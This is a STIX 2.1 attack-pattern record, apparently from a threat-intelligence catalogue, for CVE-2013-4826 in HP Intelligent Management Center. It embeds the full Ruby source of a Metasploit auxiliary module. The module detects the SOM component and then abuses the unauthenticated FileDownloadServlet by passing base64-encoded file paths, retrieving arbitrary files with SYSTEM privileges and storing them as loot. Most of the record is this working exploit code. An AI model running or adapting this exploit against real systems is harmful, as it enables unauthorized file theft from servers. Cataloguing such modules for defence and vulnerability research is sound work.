{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--34f7117f-f4b0-4275-bb50-8b540feeb6e7",
    "created": "2024-08-14T16:30:49.959244Z",
    "modified": "2024-08-14T16:30:49.959248Z",
    "name": "HP Intelligent Management SOM FileDownloadServlet Arbitrary Download",
    "description": " This module exploits a lack of authentication and access control in HP Intelligent Management, specifically in the FileDownloadServlet from the SOM component, in order to retrieve arbitrary files with SYSTEM privileges. This module has been tested successfully on HP Intelligent Management Center 5.2_E0401 with SOM 5.2 E0401 over Windows 2003 SP2.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/hp_imc_som_file_download.rb",
            "external_id": "hp_imc_som_file_download.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4826"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP Intelligent Management SOM FileDownloadServlet Arbitrary Download',\n      'Description'    => %q{\n          This module exploits a lack of authentication and access control in HP Intelligent\n        Management, specifically in the FileDownloadServlet from the SOM component, in order to\n        retrieve arbitrary files with SYSTEM privileges. This module has been tested successfully\n        on HP Intelligent Management Center 5.2_E0401 with SOM 5.2 E0401 over Windows 2003 SP2.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-4826' ],\n          [ 'OSVDB', '98251' ],\n          [ 'BID', '62898' ],\n          [ 'ZDI', '13-242' ]\n        ]\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'Path to HP Intelligent Management Center', '/imc']),\n        OptString.new('FILEPATH', [true, 'The path of the file to download', 'c:\\\\windows\\\\win.ini'])\n      ])\n  end\n\n  def is_imc_som?\n    res = send_request_cgi({\n      'uri'      => normalize_uri(\"servicedesk\", \"ServiceDesk.jsp\"),\n      'method'   => 'GET'\n    })\n\n    if res and res.code == 200 and res.body =~ /servicedesk\\/servicedesk/i\n      return true\n    else\n      return false\n    end\n  end\n\n  def my_basename(filename)\n    return ::File.basename(filename.gsub(/\\\\/, \"/\"))\n  end\n\n  def run_host(ip)\n\n    unless is_imc_som?\n      vprint_error(\"HP iMC with the SOM component not found\")\n      return\n    end\n\n    vprint_status(\"Sending request...\")\n    res = send_request_cgi({\n      'uri'          => normalize_uri(\"servicedesk\", \"servicedesk\", \"fileDownload\"),\n      'method'       => 'GET',\n      'vars_get'     =>\n        {\n          'OperType' => '2',\n          'fileName' => Rex::Text.encode_base64(my_basename(datastore['FILEPATH'])),\n          'filePath' => Rex::Text.encode_base64(datastore['FILEPATH'])\n        }\n    })\n\n    if res and res.code == 200 and res.headers['Content-Type'] and res.headers['Content-Type'] =~ /application\\/doc/\n      contents = res.body\n      fname = my_basename(datastore['FILEPATH'])\n      path = store_loot(\n        'hp.imc.somfiledownloadservlet',\n        'application/octet-stream',\n        ip,\n        contents,\n        fname\n      )\n      print_good(\"File saved in: #{path}\")\n    else\n      vprint_error(\"Failed to retrieve file\")\n      return\n    end\n  end\nend\n"
}